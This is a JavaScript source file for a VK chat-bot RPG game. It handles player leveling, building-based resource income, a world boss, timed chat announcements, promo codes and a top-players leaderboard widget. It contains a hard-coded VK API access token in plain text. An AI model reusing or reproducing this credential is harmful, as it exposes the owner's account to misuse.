function rand(min, max) {return Math.round(Math.random() * (max - min)) + min}
var parserInt = (str) => parseInt(str.replace(/k|к/ig, "000"));
function spaces(string) {
if (typeof string !== "string") string = string.toString();
	return string.split("").reverse().join("").match(/[0-9]{1,3}/g).join(".").split("").reverse().join("");
};
Array.prototype.random = function() {
	return this[Math.floor(this.length * Math.random())];
}

function uplvl(user){
	user.exp += 1;
	if(user.exp >= user.lvl * user.lvl + 5){
		user.lvl += 1;
		user.exp -= user.lvl * user.lvl + 5;
			if(user.exp < 0) user.exp = 0
		user.points += 1
        user.hp += 1
        user.damage += 1
        user.defence += 1
	}
}

function bonehoard_up(){
	let bone = world.bonehoard
	let hour = new Date().getHours() + 3
		let minute = new Date().getMinutes()
		let time = `${nols(hour)}:${nols(minute)}`
		if(!bone.exp){
			bone.exp =0
		}
		bone.exp++
		bone.gainhp++
		bone.hp = bone.starthp + bone.gainhp
	if(bone.exp >= 10){
		bone.level += 1
		bone.exp = 0
		bone.gainhp = Math.round(bone.gainhp + (bone.gainhp / 100 * 10))
		api.messages.send({
			chat_id: 33,
			message: `
🌐 #Мир [${time}]
⚡ Костоклад повысил уровень!
🖤 Здоровье Костоклада | ${world.bonehoard.starthp} (+${world.bonehoard.gainhp}) |`
			})
	}
}

setInterval(() => {
    for(i in rpg.users){
    if(rpg.users[i]){
    let user = rpg.users[i]
	if(user.exp < 0) user.exp = 0
	if(user.exp >= user.lvl * user.lvl + 5){
		user.lvl += 1;
		user.exp -= user.lvl * user.lvl + 5;
			if(user.exp < 0) user.exp = 0
		user.points += 1
        user.hp += 1
        user.damage += 1
        user.defence += 1
	}
    }
}
}, 10000)

setInterval(() => {
	for(i=1;i<250000;i++){
			if(rpg.users[i]){
				let user = rpg.users[i];
				if(user.limits.build > 0){
					user.limits.build -= 1;
					if(user.limits.build == 0){
						user.limits.build = false;
						let i = user.limits.id;
						let a = user;
						user.limits.id = false;
						if(i == 1){a.objects.lesopilka += 1; uplvl(a);}
						if(i == 2){a.objects.gold += 1; uplvl(a);}
						if(i == 3){a.objects.kamenolom += 1; uplvl(a);}
						if(i == 4){a.objects.hp += true; uplvl(a);}
						if(i == 5){a.objects.def += true; uplvl(a);}
						if(i == 6){a.objects.dmg += true; uplvl(a);}
						if(i == 7){a.objects.skill += true; uplvl(a);}
					}
				}

				if(user.objects.lesopilka > 0){
				    user.res.wood += Number(user.objects.lesopilka) * 10;
				}
				if(user.objects.kamenolom > 0){
						user.res.stone += Number(user.objects.kamenolom) * 10;
				}
				if(user.objects.gold > 0){
						user.gold += Number(user.objects.gold) * 5;
				}
			}
	}
}, 3600000);

const widgettoken = "3ddc8fb23cda20198fac448c778c85dbf478f4c71efc9eadf1911b01578b9c70b25540cdf5ee2bd6bd4a9"

function updateWidget() {
	randm = rand(1,2)
	if(randm == 1){
	var tops = []
	for(i in rpg.users){
		if(rpg.users[i].gold != 0){
			tops.push({
				id: i,
				idvk: rpg.users[i].id,
				lvl: rpg.users[i].gold
			});
		}
	}
	tops.sort(function(a, b) {
		if (b.lvl > a.lvl) return 1
		if (b.lvl < a.lvl) return -1
		return 0
	})

	var script = {
		title: `Самые богатые`,
		head: [
			{
				text: 'Ник игрока'
			},
			{
				text: 'Золото',
				align: 'right'
			},
			{
				text: 'Бриллианты',
				align: 'right'
			},
			{
				text: 'ID',
				align: 'right'
			}
		],
		body: []
	}

	for (var g = 0; g < 10; g++) {
		if (tops.length > g) {
			let ups = g;
			ups += 1;
			if (g <= 8) ups = `${ups}`
			if (g == 9) ups = `10`
			script.body.push([
				{
					icon_id: `id${tops[g].idvk}`,
					text: `${rpg.users[tops[g].id].prefix}`,
					url: `vk.com/id${tops[g].idvk}`
				},
				{
					text: `💰 ${spaces(rpg.users[tops[g].id].gold)}`
				},
				{
					text: `💎 ${spaces(rpg.users[tops[g].id].diamond)}`
				},
				{
					text: `🆔 ${tops[g].id}`
				},
			])
		}
	}
}
if(randm == 2){
	var tops = []
	for(i in rpg.users){
		if(rpg.users[i].damage != 1){
			tops.push({
				id: i,
				idvk: rpg.users[i].id,
				lvl: rpg.users[i].damage
			});
		}
	}
	tops.sort(function(a, b) {
		if (b.lvl > a.lvl) return 1
		if (b.lvl < a.lvl) return -1
		return 0
	})

	var script = {
		title: `Самые сильные`,
		head: [
			{
				text: 'Ник игрока'
			},
			{
				text: 'Сила',
				align: 'right'
			},
			{
				text: 'Здоровье',
				align: 'right'
			},
			{
				text: 'ID',
				align: 'right'
			}
		],
		body: []
	}

	for (var g = 0; g < 10; g++) {
		if (tops.length > g) {
			let ups = g;
			ups += 1;
			if (g <= 8) ups = `${ups}`
			if (g == 9) ups = `10`
			script.body.push([
				{
					icon_id: `id${tops[g].idvk}`,
					text: `${rpg.users[tops[g].id].prefix}`,
					url: `vk.com/id${tops[g].idvk}`
				},
				{
					text: `⚔ ${spaces(rpg.users[tops[g].id].damage)}`
				},
				{
					text: `❤ ${spaces(rpg.users[tops[g].id].hp)}`
				},
				{
					text: `🆔 ${tops[g].id}`
				},
			])
		}
	}
}
	requestp.post({
		url: 'https://api.vk.com/method/appWidgets.update',
		form: {
			v: '5.103',
			type: 'table',
			code: `return ${JSON.stringify(script)};`,
			access_token: widgettoken
	}},
	function(err, resp, body) {
	});
}

	setInterval(() => {
		updateWidget()
	}, 30000);

function nols(num) {
    if(num < 10) return('0' + num)
    if(num > 9) return(num)
}

	setInterval(() => {
		let hour = new Date().getHours() + 3
		let minute = new Date().getMinutes()
		let time = `${nols(hour)}:${nols(minute)}`
		if(time == `00:00` || time == `09:00` || time == `15:00`){
			let x = rand(0, 5);
			world.element = x
			api.messages.send({
			chat_id: 33,
			message: `
🌐 #Мир [${time}]
⚡ Разлом мутировал > Элемент: ${x.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")} 👁‍🗨
🖤 Здоровье Костоклада | ${world.bonehoard.starthp} (+${world.bonehoard.gainhp}) |`
			})
		}
	}, 50000);

/*
	setInterval(() => {
		let hour = new Date().getHours()
		let minute = new Date().getMinutes()
		let time = `${nols(hour)}:${nols(minute)}`
		if(time == `09:00`){
			rpromos()
		}
	}, 50000);

	setInterval(() => {
		let hour = new Date().getHours()
		let minute = new Date().getMinutes()
		let time = `${nols(hour)}:${nols(minute)}`
		if(time == `12:00`){
			rpromos()
		}
	}, 50000);

	setInterval(() => {
		let hour = new Date().getHours()
		let minute = new Date().getMinutes()
		let time = `${nols(hour)}:${nols(minute)}`
		if(time == `18:00`){
			rpromos()
		}
	}, 50000);
*/
    function rpromos() {
        var result  = '';
        let text = '';
		let words  = 'abcdefghijklmnopqrstuvwxyz1234567890';
		let max_position = words.length - 1;
		for( i = 0; i < 8; ++i ) {
			position = Math.floor ( Math.random() * max_position );
			result = result + words.substring(position, position + 1);
		}
        let a = rand(1,4)
		let b = rand(1,2)
        let c = 1
        if(a == 1){
		c = rand(1000,5000)
        }
        if(a == 2 || a == 3){
		c = rand(100,500)
        }
        if(a == 4){
		c = rand(1,3)
        }
		let cods = 0;
			if(a==1){
				cods = cod();
				rpcode[cods] = { id: 1, name: 'gold', activ: Number(b), count: Number(c), users: {} }
				text += `🔸 Промокод на ${c} золота создан.\n🔸 Активаций: ${b}\n🔸 Для активации напишите:\n🔸 !промокод ${cods}`
			}
			if(a==2){
				cods = cod();
				rpcode[cods] = { id: 2, name: 'wood', activ: Number(b), count: Number(c), users: {} }
				text += `🔸 Промокод на ${c} дерева создан.\n🔸 Активаций: ${b}\n🔸 Для активации напишите:\n🔸 !промокод ${cods}`
			}
			if(a==3){
				cods = cod();
				rpcode[cods] = { id: 3, name: 'stone', activ: Number(b), count: Number(c), users: {} }
				text += `🔸 Промокод на ${c} камня создан.\n🔸 Активаций: ${b}\n🔸 Для активации напишите:\n🔸 !промокод ${cods}`
			}
			if(a==4){
				cods = cod();
				rpcode[cods] = { id: 4, name: 'rolls', activ: Number(b), count: Number(c), users: {} }
				text += `🔸 Промокод на ${c} вращений создан.\n🔸 Активаций: ${b}\n🔸 Для активации напишите:\n🔸 !промокод ${cods}`
			}

    api.messages.send({
		peer_id: 2000000000 + 33,
		message: text
		});
    }

 process.on('unhandledRejection', (reason, p) => {
  console.log('Unhandled Rejection at: Promise', p, 'reason:', reason);
  // application specific logging, throwing an error, or other logic here
});

async function run() {
    console.log("Бот работает...");
	for(let i in rpg.users){
    let user = rpg.users[i]
		}
	}
	updateWidget()
vk.updates.start().catch(console.error);
